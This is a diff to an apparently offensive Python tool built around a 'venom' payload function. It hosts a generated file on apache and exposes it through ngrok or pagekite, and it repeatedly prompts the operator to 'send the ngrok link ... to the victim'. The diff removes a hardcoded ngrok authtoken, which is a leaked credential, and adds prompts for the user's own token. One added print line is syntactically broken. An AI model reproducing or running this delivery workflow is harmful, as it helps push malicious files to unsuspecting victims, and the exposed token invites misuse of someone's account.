@@ -1,4 +1,5 @@
 import os
+import webbrowser
 print("""
   ______ ______ ____  _____  ________      __ __      ________ _   _  ____  __  __ 
  |  ____|  ____|  _ \|  __ \|  ____\ \    / / \ \    / /  ____| \ | |/ __ \|  \/  |
@@ -105,8 +106,14 @@ def venom():
             print(f" FOR EXAMPLE : ===>> https://1234abc45d.ngrok.io/{name}")
             ack=input("do you understand?? : ")
             os.system("service apache2 start")
-            os.system("./ngrok authtoken 2XcCsw8PnxhUVTGfNWwnh_3fNaAM4NLwHS7Tk9mvwBw")
-            os.system("./ngrok http 80")
+            ngrok=input("DO YOU HAVE AN ACCOUNT IN NGROK? [Y/n]....: ")
+            if ngrok=="n" or ngrok=="N":
+                  print(" ##### PLEASE ENTER THE AUTHTOKEN OF YOUR ACCOUNT#####")
+                  webbrowser.open("https://dashboard.ngrok.com/signup")
+                  auth=input(" ENTER THE STRING AUTHTOKEN ALONE(without './ngrok authtoken 'phrase : ")
+                  os.system(f"./ngrok authtoken {auth}")
+                  os.system("./ngrok http 80")
+            
       elif link==2:
            os.system(f"cp {output}/{name} /var/www/html")
            print("INSTALLING PAGEKITE FOR YOU>>>>")
@@ -131,9 +138,30 @@ def venom():
            print(f" FOR EXAMPLE : ===>> https://1234abc45d.ngrok.io/{name}")
            ack=input("do you understand?? : ")
            os.system("service apache2 start")
-           os.system("./ngrok authtoken 2XcCsw8PnxhUVTGfNWwnh_3fNaAM4NLwHS7Tk9mvwBw")
-           os.system("./ngrok http 80")
-            
+           ngrok=input("DO YOU HAVE AN ACCOUNT IN NGROK? [Y/n]....: ")
+           if ngrok=="n" or ngrok=="N":
+                 print(" ##### PLEASE ENTER THE AUTHTOKEN OF YOUR ACCOUNT#####")
+                 webbrowser.open("https://dashboard.ngrok.com/signup")
+                 auth=input(" ENTER THE AUTHTOKEN STRING ALONE(without './ngrok authtoken' phrase : ")
+                 os.system(f"./ngrok authtoken {auth}")
+                 os.system("./ngrok http 80")
+           else:
+               print("NICE , you have an account in ngrok...")
+               if os.path.isfile("/root/.ngrok2/ngrok.yml"):
+                   print(f"send the ngrok link/{name} and send to the victim..!!")
+                   print(f" FOR EXAMPLE : ===>> https://1234abc45d.ngrok.io/{name}")
+                   os.system("./ngrok http 80")
+               else:
+                   print("YOUR SYSTEM IS NOT CONFIGURED NGROK PROPERLY...)
+                   print("PLEASE LOGIN YOUR NGROK ACCOUNT AND COPY THE AUTHTOKEN ALONE :")
+                   input("ENTER TO CONTINUE , LOGIN :")
+                   webbrowser.open("https://dashboard.ngrok.com/login")
+                   auth2=input("ENTER THE AUTHTOKEN STRING ALONE : ")
+                   os.system(f"./ngrok authtoken {auth2}")
+                   input(f"send the ngrok link/{name} and send to the victim..!!('enter to continue!)")
+                   input(f" FOR EXAMPLE : ===>> https://1234abc45d.ngrok.io/{name}(enter to continue)")
+                   os.system("./ngrok http 80")
+                         
     elif server=="n" or server=="N":
         exiting=input("ANY KEY TO EXIT....")
         print("##########  HAPPY HACKING ###########")
